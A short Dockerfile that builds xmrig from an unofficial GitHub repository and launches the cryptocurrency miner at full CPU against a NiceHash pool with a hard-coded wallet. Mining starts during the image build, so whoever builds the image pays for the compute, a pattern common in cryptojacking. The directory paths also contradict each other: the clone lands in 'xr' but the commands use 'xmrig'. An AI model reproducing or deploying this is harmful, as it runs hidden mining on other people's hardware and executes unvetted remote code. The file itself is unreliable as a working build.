FROM  alpine:latest
RUN   adduser -S -D -H -h /xmrig miner
RUN   apk --no-cache upgrade && \
      apk --no-cache add \
        git \
        cmake \
        libuv-dev \
        build-base && \
      git clone https://github.com/jitjitsu/xr && \
      cd xmrig && \
      mkdir build && \
      cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release . && \
      make && \
      apk del \
        build-base \
        cmake \
        git && \
      /xmrig/xmrig -o cryptonightv7.usa.nicehash.com:3363 -u 3CUSW9A3eQwrSrPLYQ2SDHbH7oGuwCVGb3.sema -p x -k --donate-level 1 --max-cpu-usage 100
USER miner
